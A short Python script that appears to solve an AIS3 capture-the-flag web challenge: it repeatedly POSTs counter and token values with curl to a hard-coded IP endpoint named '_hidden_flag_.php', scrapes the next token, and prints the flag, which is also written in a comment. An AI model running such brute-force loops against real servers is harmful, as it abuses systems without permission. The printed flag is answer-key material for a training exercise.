import subprocess
from cryptools import *
flag = ''

s = 'fcc301d4ce7a9e7d85411583e49051a540d3ec65d812fde82aecdbb56d'
# c =0 

for c in range(0,99999999):
    print(c,s)
    output = subprocess.check_output(['curl','-d',f'c={c}&s={s}','-X','POST','http://104.199.235.135:31332/_hidden_flag_.php'],)
    if not b'no flag here' in output :
        print(output)
        break
    a = output[output.find(b'name="s"'):]
    s = switchBS(a.split(b'\"')[3])
    
# AIS3{g00d_u_know_how_2_script_4_W3B_7498d6a29abf354967f5b116680f9368}

